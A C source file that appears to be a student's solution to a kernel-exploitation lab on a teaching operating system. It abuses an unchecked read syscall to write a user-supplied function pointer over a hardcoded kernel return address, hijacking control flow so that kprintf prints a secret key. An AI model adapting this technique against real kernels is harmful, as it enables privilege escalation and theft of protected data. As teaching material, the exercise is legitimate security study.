#include <stdio.h>
#include <fcntl.h>

char* kprintfstrg = "This is the content of %x: %s";

void hack(size_t arg1, size_t arg2, size_t* to_read){
    typedef void (*kprintf_ptr)(const char*,...);
    kprintf_ptr k = (kprintf_ptr )0x8000202e; //kprintf function
    k("This is the content of %x: %s\n", *to_read, *to_read);
}

int main()
{
  size_t to_read = __syscall(sc_getkeyinfo, 0x00, 0x00, 0x00, 0x00, 0x00);
  printf("We need to read from %x\n", to_read);

  /* YOUR CODE HERE */
    printf("THIS IS THE HACK FUNCTION ohne & %x, mit & %x\n", hack, &hack);
    size_t buffer[5];
    //buffer[0] = 0x8000202e; //kprintf function
    buffer[0] = hack;
    buffer[1] = 0x1; //not used anymore
    buffer[2] = (size_t )kprintfstrg; //not used anymore
    buffer[3] = to_read;
    buffer[4] = to_read;

  size_t expected_return_address = 0x8013616c;
  size_t to_overwrite = expected_return_address;
  printf("To overwrite Address: %x\n", to_overwrite);

  int fd = __syscall(sc_open, "open.txt", O_CREAT | O_RDWR, 0777, 0x00, 0x00);
  printf("file descriptor return must be number: %d\n", fd);
  int retval = __syscall(sc_write, fd, buffer, 5*sizeof(size_t), 0x00, 0x00);
  printf("retval of write syscall must be <1: %d\n", retval);
  int retval2 = __syscall(sc_read, fd, to_overwrite, 5*sizeof(size_t), 0x00, 0x00);

  return 0;
}
